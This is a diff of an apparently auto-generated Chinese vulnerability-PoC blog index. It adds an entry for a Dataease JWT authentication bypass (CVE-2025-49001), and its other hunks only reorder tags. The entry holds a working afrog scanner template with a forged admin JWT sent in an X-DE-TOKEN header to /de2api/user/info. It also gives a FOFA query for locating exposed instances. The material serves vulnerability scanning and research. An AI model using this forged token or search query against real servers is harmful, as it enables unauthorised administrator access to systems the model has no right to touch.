@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>Dataease JWT 认证绕过漏洞</title>
+    <link href="/2025/06/11/github_2921577789/"/>
+    <url>/2025/06/11/github_2921577789/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Dataease JWT 认证绕过漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49001</li></ul><p><strong>漏洞类型：</strong> 权限绕过</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2025-49001 是由于JWT校验机制错误导致攻击者可伪造JWT令牌绕过身份验证流程</p><p><strong>产品厂商：</strong> Dataease</p><p><strong>产品名称：</strong> Dataease</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;js&#x2F;index-0.0.0-dataease.js” || body&#x3D;”&#x2F;assets&#x2F;css&#x2F;style-0.0.0-dataease.css”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/d5c4fe79940f2fa4077a3348da5e9f899225c76d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-49001.yaml">https://github.com/zan8in/afrog/blob/d5c4fe79940f2fa4077a3348da5e9f899225c76d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-49001.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">49001</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Dataease JWT 认证绕过漏洞<br>  <span class="hljs-params">author:</span> avic123<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">49001</span> 是由于JWT校验机制错误导致攻击者可伪造JWT令牌绕过身份验证流程<br>    fofa：body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/js/index-0.0.0-dataease.js&quot;</span> <span class="hljs-operator">||</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/assets/css/style-0.0.0-dataease.css&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/2-FBRPZdPY-4MLYC9Syveg</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,Dataease,JWT<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/11</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/de2api/user/info</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">X-DE-TOKEN:</span> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8<br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>id<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>1<span class="hljs-char escape_">\&quot;</span>&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>name<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>系统管理员<span class="hljs-char escape_">\&quot;</span>&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b<span class="hljs-string">&quot;<span class="hljs-char escape_">\&quot;</span>oid<span class="hljs-char escape_">\&quot;</span>:<span class="hljs-char escape_">\&quot;</span>1<span class="hljs-char escape_">\&quot;</span>&quot;</span>)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>权限绕过</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Apache Struts 路径遍历与远程代码执行漏洞</title>
     <link href="/2025/06/11/github_4241703152/"/>
     <url>/2025/06/11/github_4241703152/</url>
@@ -1003,9 +1030,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -2449,9 +2476,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3583,9 +3610,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -3610,9 +3637,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -4258,9 +4285,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5012,9 +5039,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -5714,9 +5741,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -5849,9 +5876,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -5957,9 +5984,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -8755,9 +8782,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
@@ -9102,9 +9129,9 @@
     
     <tags>
       
-      <tag>CVE-2024:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2024:github search</tag>
       
     </tags>
     
@@ -9364,9 +9391,9 @@
     
     <tags>
       
-      <tag>跨站可执行脚本</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>跨站可执行脚本</tag>
       
     </tags>
     
@@ -9524,9 +9551,9 @@
     
     <tags>
       
-      <tag>缓冲区溢出</tag>
-      
       <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
       
     </tags>
     
